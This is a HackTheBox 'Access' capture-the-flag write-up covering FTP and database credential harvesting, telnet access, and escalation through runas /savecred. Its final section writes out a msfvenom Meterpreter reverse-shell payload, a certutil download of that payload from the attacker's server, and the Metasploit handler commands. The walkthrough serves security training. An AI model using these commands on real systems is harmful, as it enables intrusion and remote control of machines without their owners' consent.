---
layout: post
title: HackTheBox Access Writeup
---

### Enumeration

First, start of by doing a basic nmap numeration scan: ```nmap -sC -sV -oA NAME 10.10.10.95```. Doing this, it will output the result to whatever you set ```NAME``` to. Here are the results:

![image](https://user-images.githubusercontent.com/41026969/70803191-7b02f700-1d81-11ea-896b-0bb5043abf33.png)

There are a few things that we see, that we can do further enumeraiton on:

##### FTP Enumeration

One of the first things we see on the nmap scan is that port 21 - FTP is open. With that, it is also revealed that there is anonymous login allowed. This means that when attemping to FTP into ```10.10.10.98``` we can use username ```anonymous``` and any password of our chosing to connect to the service.

Logging in via FTP reveals two directories: ```Backups``` and ```Engineer```. Inside ```Backups``` there is a ```backup.mdb``` and inside ```Engineer``` there is an ```Access Control.zip```. Here's a picture of the file directory shown when logging into FTP:

![image](https://user-images.githubusercontent.com/41026969/70803869-0b8e0700-1d83-11ea-8d94-485f48ec080a.png)

When you're inside each of the respective directories, to get the file on your local system you can do ```get "Access Control.zip"``` or ```get "backup.mdb"```. Getting in on your local system means we can do further analysis. 

Trying to do ```unzip Access\ Control.zip``` shows that we cannot unzip the file because ```unsupported compression method 99```. Doing some research, I try using 7zip: ```7z x Access\ Control.zip```. This time, it prompts us for a password which is currently still unknown shown here:

![image](https://user-images.githubusercontent.com/41026969/70804310-27de7380-1d84-11ea-9c2e-503cc2ebb6b0.png)

Next, let's observe the ```backup.mdb``` file. ```*.mdb``` stands for microsoft database which is created by Microsoft Access which is a desktop database program. It holds information in tables/columns/rows.

To lists the tables I first try to do: ```mdb-tables.mdb``` but I get this error:

![image](https://user-images.githubusercontent.com/41026969/71221267-16243100-229a-11ea-8a3b-3fbba33812bd.png)

Doing some research, I realize that when using ```get [file]``` in ftp, the default mode is ```ascii```. There are a couple modes of transferring files: ```ascii``` and ```binary```. Basically here's what each of the following does:

```ascii```: transfers files as text. Exampels of files to get using this mode: .txt, .asp, .html, .php, etc.

```binary```: transfers files as raw data. Examples of files to get using this mode: .wav, .jpg, .gif, .mp3, and .mdb files.

Now knowing this, we just need to ```get``` the file again, but this time in binary mode. We can do this by just typing in ```binary``` when in the ftp shell to switch to binary mode. Conversely to switch to ```ascii``` mode you can just type in ```ascii```. Here's the process shown below along with listing out the tables stored to show we transferred the file successfully:

![image](https://user-images.githubusercontent.com/41026969/71221884-4240b180-229c-11ea-8c04-dfe5788f4a07.png)

##### Looking through the mdb file

So you can list the tables by doing ```mdb-tables backup.mdb```. Then to export the tables I do the command ```for i in $(mdb-tables backup.mdb); do mdb-export backup.mdb $i > $i; done```. So what this command does, is that for every output from ```mdb-tables backup.mdb``` it will export that table and save it as the table name. Doing so will create a bunch of ASCII texts that I later moved into a separate folder to keep things clean and organized.

The next step is going through each of the text files and trying to find something useful. For this part, I created a simple bash script: ```finder.sh```. What it basically does is that for all the text files in the directory, it does a ```grep``` check and looks for the pattern/string ```pass``` (password), if it finds that string, it will output the file name. The ```-q``` means that it will only return Here's the bash script (also attached above):

```
for i in $(ls);
do 
	if grep -q pass $i 
	then
 	   	echo $i
		echo found string 'pass'
	fi
done
```

Executing the script ```bash finder.sh``` reveals two files that have possible interesting material:

```
auth_user
found string pass
finder.sh (note: this is the bash script so it doesn't count)
found string pass
USERINFO
found string pass
```

Checking each of the files ```auth_user```, and ```USERINFO```. We see there's some credentials in plaintext in ```auth_user```:

```
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```

So we got username ```engineer``` and password ```access4u@security```. There was a directory earlier called ```Engineer``` with the locked zip file! Going back and trying to unzip the file with the password unlocks it!

Unzipping outputs a pst file called ```Access Control.pst```. Doing some research a pst file is ```a Personal Storage Table... used to store copies of messages, calendar events, and other items within Microsoft software```. So we essentially got some message.

Initially, doing ```cat``` did not work. Doing some research, I found out [by this website](http://theevilbit.blogspot.com/2013/01/backtrack-forensics-convert-pst-mail.html) that we can do ```readpst Access\ Control.pst``` and it will output a file which contains the message in plaintext format. The file it outputted for me was ```Access Control.mbox``` and thus doing ```cat Access\ Control.mbox``` gets us the message:

```
From "john@megacorp.com" Thu Aug 23 19:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
	boundary="--boundary-LibPST-iamunique-1328422671_-_-"


----boundary-LibPST-iamunique-1328422671_-_-
Content-Type: multipart/alternative;
	boundary="alt---boundary-LibPST-iamunique-1328422671_-_-"

--alt---boundary-LibPST-iamunique-1328422671_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,

 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

 

Regards,

John
```

Cool, we got another credential: ```security:4Cc3ssC0ntr0ller```.

##### Enumerating telnet and User flag

Moving onto the next service that's open: telnet.

Doing ```telnet 10.10.10.98``` we are greeted by a login, trying the credentials we found above, we got a shell! Doing a ```whoami``` check shows that we are ```access\security```:

![image](https://user-images.githubusercontent.com/41026969/71337931-bdfc6180-251b-11ea-9afe-619ae451c0f0.png)

Looking around and ending up in the ```Desktop``` directory, I eventually found the ```user.txt``` flag:

```
C:\Users\security\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\security\Desktop

08/28/2018  06:51 AM    <DIR>          .
08/28/2018  06:51 AM    <DIR>          ..
08/21/2018  10:37 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  16,772,481,024 bytes free

```

Now let's check the other users in the system which is under ```C:\Users\```

![image](https://user-images.githubusercontent.com/41026969/71538767-e19a2000-28fe-11ea-85a2-6004b1dcfc7d.png)

Checking if we have access to ```Administrator``` it returns ```Access is denied.``` There is another user that we can enumerate: ```Public```.

Initially doing a ```dir``` check to see what's inside reveals a few files:

```
C:\Users\Public>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\Public

07/14/2009  04:57 AM    <DIR>          .
07/14/2009  04:57 AM    <DIR>          ..
07/14/2009  05:06 AM    <DIR>          Documents
07/14/2009  04:57 AM    <DIR>          Downloads
07/14/2009  04:57 AM    <DIR>          Music
07/14/2009  04:57 AM    <DIR>          Pictures
07/14/2009  04:57 AM    <DIR>          Videos
               0 File(s)              0 bytes
               7 Dir(s)  16,771,854,336 bytes free

```

Checking into each of those directories, there wasn't anything interesting. Though doing a more thorough search by doing ```dir /A``` to reveal hidden files revealed more files in ```C:\Users\Public```:

```
C:\Users\Public>dir /A
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\Public

07/14/2009  04:57 AM    <DIR>          .
07/14/2009  04:57 AM    <DIR>          ..
08/28/2018  06:51 AM    <DIR>          Desktop
07/14/2009  04:57 AM               174 desktop.ini
07/14/2009  05:06 AM    <DIR>          Documents
07/14/2009  04:57 AM    <DIR>          Downloads
07/14/2009  02:34 AM    <DIR>          Favorites
07/14/2009  04:57 AM    <DIR>          Libraries
07/14/2009  04:57 AM    <DIR>          Music
07/14/2009  04:57 AM    <DIR>          Pictures
07/14/2009  04:57 AM    <DIR>          Videos
               1 File(s)            174 bytes
              10 Dir(s)  16,771,854,336 bytes free
```

There's a ```Desktop```, ```Favorites```, and a ```Libraries``` folder that was hidden. Checking the ```Favorites``` and ```Libraries``` folder didn't reveal anything interesting. However checking the ```Desktop``` folder, there's a ```.lnk``` file!

![image](https://user-images.githubusercontent.com/41026969/71539070-c5997d00-2904-11ea-9cf1-20ab9a0664e7.png)

Doing some google searches and eventually opening up [this article](https://whatis.techtarget.com/fileformat/LNK-Shortcut-file-Microsoft-Windows-9-x) I learn that a ```.lnk``` file is a shortcut file used by windows to point to an executable file. Doing ```type "ZKAccess3.5 Security System.lnk"``` to show any strings that might be useful outputs the following:

```
C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
L�F�@ ��7���7���#�P/P�O� �:i�+00�/C:\R1M�:Windows��:��M�:*wWindowsV1MV�System32��:��MV�*�System32X2P�:�
                                                                                                        runas.exe��:1��:1�*Yrunas.exeL-K��E�C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�
                                              �wN���]N�D.��Q���`�Xaccess�_���8{E�3
                                                                                  O�j)�H���
                                                                                           )ΰ[�_���8{E�3
                                                                                                        O�j)�H���
                                                                                                                 )ΰ[�	��1SPS�XF�L8C���&�m�e*S-1-5-21-953262931-566350628-63446256-500
```

There are a few things interesting about the strings it outputted:

1. ```runas.exe``` is being executed which is in the ```System32``` file
2. ```\savecred```
3. and something called ```Access.exe``` is being executed

### Exploitation/Privilege Escalation - Getting Administrator Access

Doing some research, I found out more about ```\savecred``` [here](https://www.howtogeek.com/124087/how-to-create-a-shortcut-that-lets-a-standard-user-run-an-application-as-administrator/). This is what it says:

![image](https://user-images.githubusercontent.com/41026969/71539269-a2240180-2907-11ea-8c46-c1da0ff6eb02.png)

Basically ```runas /savecred```, is similar to using the ```sudo``` command to execute any commands that needed escalated priviledges. E

Remembering what I've done in previous challenges and doing some research about msfvenom, I learn that we can create a custom executable that will basically get us a reverse shell using metasploit and msfvenom. First, I do some research and end up on [this website](https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/) and use the ```Windows Meterpreter Reverse TCP Shell```. 

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe
```

Explanation of command above: ```msfvenom``` is the program name, ```-p``` is the payload, ```LHOST``` is the local host (our host machine, without the <>). ```LPORT``` is the port we'll be listening on (again without the <>, I chose 4444 for this challenge), ```-f``` is the format, in this case, ```.exe```. And the ```>``` means we'll be saving it as ```shell.exe```.

This will output the resulting executable in ```shell.exe```.

First, on the directory ```shell.exe``` is in, I do ```python -m SimpleHTTPServer```. This will create an HTTP server hosting the files. 

Second, I have to get the ```shell.exe``` file on the victim machine. I realize that I'm on a directory that I do not own (since we are user Security, this can be confirmed by doing ```powershell Dir | Get-Acl``` and it shows that it is owned by ```BUILTIN\Administrators ```.). So I switch to ```C:\Users\security\Desktop```. Then, doing ```powershell Get-Host``` shows that we're on powershell 2.0. Meaning Invoke-Webrequest isn't a thing (it's only in versions >= 3). Doing some research and attempting a powershell 2 workaround [found here](https://codehollow.com/2016/02/invoke-webrequests-via-powershell/) ended up not working for me. I eventually land on [this webpage](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl) and I discover that ```certutil``` can be used to download the file. So with the HTTP server running on my host machine I do:

```
certutil.exe -urlcache -split -f "http://10.10.14.27:8000/shell.exe" shell.exe
```

This will output the downloaded file as ```shell.exe```.

Third, I need to get the metasploit ready:

```
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST <local IP address>
LHOST => <local IP address>
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on <local IP address>:4444 
msf5 exploit(multi/handler) > 
```
*NOTE: It's important the payload you set is the same used in msfvenom

Fourth, now that metasploit is ready, all we have to do is execute the ```shell.exe``` as administrator. Doing a little research on runas with savecred available. I come across [this website](https://www.dummies.com/programming/networking/network-administration-runas-command/) detailing on how to use the runas command. In short, I do this command to execute the program:

```
C:\Users\security\Desktop>runas /savecred /user:Administrator "C:\Users\security\desktop\shell.exe"
```

Checking back to my other terminal which has metasploit open, there's a reverse TCP handler!

```
[*] Meterpreter session 1 opened
```

Now on metasploit, we can do ```sessions -i 1``` to go into interactive mode with session 1.

Doing a ```sysinfo``` check confirms that I'm on ACCESS with the correct OS and version. Last, doing ```shell``` to spawn a windows shell and then doing ```whoami``` on that shell reveals that we are ```Administrator```!

![image](https://user-images.githubusercontent.com/41026969/71541103-af4dea00-2921-11ea-9a02-0207cc721325.png)

Tracing back earlier to the ```C:\Users\``` directory, we see there's an ```Administrator``` directory that, this time, I can get into. Going in the ```Administrator\Desktop``` directory and doing a ```dir /A``` check, we find the root flag!

![image](https://user-images.githubusercontent.com/41026969/71541141-2be0c880-2922-11ea-907f-a36dec891284.png)

### Flags

User: ```C:\Users\security\Desktop\user.txt```

Root: ```C:\Users\Administrator\Desktop\root.txt```